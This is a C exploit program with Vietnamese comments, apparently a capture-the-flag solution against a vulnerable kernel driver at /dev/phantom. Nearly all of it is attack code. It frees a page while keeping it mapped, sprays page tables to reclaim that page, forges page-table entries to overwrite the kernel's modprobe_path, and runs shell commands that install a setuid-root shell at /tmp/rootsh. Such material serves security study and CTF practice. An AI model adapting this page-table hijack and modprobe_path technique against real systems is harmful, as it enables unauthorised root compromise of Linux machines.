#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <stdint.h>

// Định nghĩa từ interface.h
#define CMD_ALLOC 0x133701
#define CMD_FREE  0x133702

// Kích thước trang
#define PAGE_SIZE 0x1000
// Vùng spray đủ lớn để ép kernel tạo nhiều bảng PTE
#define SPRAY_SIZE (100 * 1024 * 1024) 

int fd;
uint64_t *uaf_view; // Cửa sổ nhìn vào trang vật lý bị UAF

void fatal(const char *msg) {
    perror(msg);
    exit(1);
}

// Hàm trợ giúp để gọi ioctl
void alloc_page() {
    if (ioctl(fd, CMD_ALLOC) < 0) fatal("ioctl alloc");
}

void free_page() {
    if (ioctl(fd, CMD_FREE) < 0) fatal("ioctl free");
}

int main() {
    printf("[*] Opening phantom device...\n");
    fd = open("/dev/phantom", O_RDWR);
    if (fd < 0) fatal("open");

    // ==========================================
    // BƯỚC 1: TẠO UAF
    // ==========================================
    printf("[*] Allocating vulnerable page...\n");
    alloc_page();

    // Map trang này vào không gian người dùng
    // Kernel trả về địa chỉ ảo (userland) trỏ vào trang vật lý
    uaf_view = (uint64_t*)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
    if (uaf_view == MAP_FAILED) fatal("mmap");
    
    printf("[*] Mapped address: %p\n", uaf_view);
    printf("[*] Initial content: 0x%lx\n", uaf_view[0]); // Nên là 0x4141...

    printf("[*] Triggering UAF (Freeing page but keeping mapping)...\n");
    free_page();
    // Lúc này uaf_view vẫn truy cập được, nhưng trang vật lý đã bị trả về OS.

    // ==========================================
    // BƯỚC 2: SPRAY PTE (Rải thảm Page Tables)
    // ==========================================
    printf("[*] Spraying memory to force PTE reuse...\n");
    
    // Map một vùng nhớ lớn ở user space
    char *spray_area = mmap(NULL, SPRAY_SIZE, PROT_READ | PROT_WRITE, 
                           MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if (spray_area == MAP_FAILED) fatal("spray mmap");

    // Chạm (write) vào từng trang của vùng nhớ lớn để ép kernel cấp phát PTE
    // Mỗi trang 4KB cần 1 PTE (8 bytes). 
    // Một trang PTE (4KB) chứa được 512 entries, quản lý 512 * 4KB = 2MB.
    // Với 100MB spray, ta cần khoảng 50 trang PTE. Cơ hội trúng UAF page khá cao.
    for (uint64_t i = 0; i < SPRAY_SIZE; i += PAGE_SIZE) {
        spray_area[i] = 'A'; // Write trigger allocation
        
        // Kiểm tra xem trang UAF của ta đã bị biến đổi chưa
        // Nếu nó không còn là 0x4141... thì nó đã bị kernel dùng lại.
        if (uaf_view[0] != 0x4141414141414141) {
            printf("[+] HIT! Page reused at spray offset 0x%lx\n", i);
            break;
        }
    }

    if (uaf_view[0] == 0x4141414141414141) {
        printf("[-] Failed to reclaim page as PTE. Try adjusting SPRAY_SIZE.\n");
        exit(1);
    }

    // ==========================================
    // BƯỚC 3: TÍNH TOÁN VÀ GHI ĐÈ
    // ==========================================
    // Lúc này uaf_view đang trỏ vào một trang chứa các PTE.
    // Các PTE này trỏ vào các trang vật lý của 'spray_area'.
    // Cấu trúc PTE x86_64: [ Physical Address (bit 12-51) | Flags (bit 0-11) ]
    // Flags thường là: 0x67 (User, RW, Present...)
    
    printf("[*] Leaked content from UAF page (PTE entry): 0x%lx\n", uaf_view[0]);

    /* LƯU Ý QUAN TRỌNG VỀ KASLR & PHYSICAL ADDRESS:
       Để ghi đè modprobe_path, bạn cần biết:
       1. Địa chỉ KERNEL BASE (vì KASLR bật).
       2. Địa chỉ VẬT LÝ của KERNEL BASE (để tạo PTE trỏ vào đó).
       
       Trong QEMU/Linux thông thường:
       - Kernel Virtual Base: 0xffffffff81000000 (nếu không KASLR)
       - Kernel Physical Base: 0x1000000 (thường là vậy)
       
       Nếu KASLR bật, bạn cần leak. Nếu chưa có leak, bạn cần dùng UAF này để leak trước.
       Giả sử bạn đã tìm được 'modprobe_path' physical address từ bước debug.
    */
    
    // TODO: Thay giá trị này bằng địa chỉ vật lý của modprobe_path lấy từ gdb
    // Ví dụ trong gdb: p/x &modprobe_path -> lấy physical address của nó.
    uint64_t target_phys_addr = 0xdeadbeef; // <--- SỬA CHỖ NÀY
    
    // Tạo fake PTE: Trỏ vào target với quyền RW, User, Present
    uint64_t fake_pte = (target_phys_addr & 0xFFFFFFFFFFFFF000) | 0x67; 
    
    printf("[*] Overwriting PTE to point to physical address 0x%lx...\n", target_phys_addr);
    
    // Tìm entry nào trong uaf_view đang trỏ tới trang của spray_area mà ta vừa ghi
    // Để đơn giản, ta có thể ghi đè TOÀN BỘ trang UAF bằng fake_pte
    // Khi đó, một phần của spray_area sẽ trỏ về modprobe_path
    for (int i = 0; i < 512; i++) {
        uaf_view[i] = fake_pte;
    }

    // ==========================================
    // BƯỚC 4: GHI ĐÈ MODPROBE_PATH
    // ==========================================
    // Bây giờ, việc ghi vào spray_area sẽ thực chất là ghi vào target_phys_addr
    printf("[*] Overwriting modprobe_path via sprayed area...\n");
    
    char *new_cmd = "/tmp/x";
    // Ta phải tìm xem đoạn nào trong spray_area tương ứng với cái PTE ta vừa sửa.
    // Do ta ghi đè cả trang PTE, nên rất nhiều trang trong spray_area giờ trỏ về target.
    // Thử ghi vào từng trang một và hy vọng trúng.
    
    for (uint64_t i = 0; i < SPRAY_SIZE; i += PAGE_SIZE) {
        // Ghi đè chuỗi "/tmp/x" vào đầu trang
        // Nếu trang này được map qua PTE giả, nó sẽ ghi vào modprobe_path
        strcpy((char*)(spray_area + i), new_cmd);
    }

    // ==========================================
    // BƯỚC 5: KÍCH HOẠT VÀ LẤY FLAG
    // ==========================================
    printf("[*] Setting up trigger files...\n");
    system("echo '#!/bin/sh\ncp /bin/sh /tmp/rootsh\nchmod 4777 /tmp/rootsh' > /tmp/x");
    system("chmod +x /tmp/x");
    
    system("echo -e '\xff\xff\xff\xff' > /tmp/dummy");
    system("chmod +x /tmp/dummy");

    printf("[*] Triggering modprobe...\n");
    system("/tmp/dummy");

    printf("[*] Checking for root shell...\n");
    system("/tmp/rootsh -p");

    return 0;
}